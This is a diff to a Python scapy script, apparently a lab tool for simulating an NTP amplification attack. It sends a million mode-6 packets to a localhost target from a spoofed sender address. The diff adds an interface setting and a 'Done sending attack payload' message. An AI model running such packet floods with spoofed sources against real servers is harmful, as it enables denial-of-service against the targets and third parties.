@@ -6,10 +6,11 @@ from scapy.layers.ntp import NTP
 
 ##########################################################################################################
 
-target_ip="127.0.0.1" # vulnerable NTP server
-sender_ip="0.0.0.0"   # Spoofed IP address of the sender. Useful for simulation of amplification attack.
+target_ip="127.0.0.1"   # vulnerable NTP server
+sender_ip="0.0.0.0"     # Spoofed IP address of the sender. Useful for simulation of amplification attack.
 packet_amount=1000000   # Amount of packets sent.
-packet_mode=6         # NTP packet mode. Useful for simulation of Control/Debug messages.
+packet_mode=6           # NTP packet mode. Useful for simulation of Control/Debug messages.
+interface="lo"          # Name of network interface to use
 
 ##########################################################################################################
 
@@ -22,4 +23,5 @@ pkt = (
     )
 )
 
-sendpfast(pkt,count=packet_amount)
+sendpfast(pkt,count=packet_amount,iface=interface)
+print("Done sending attack payload")
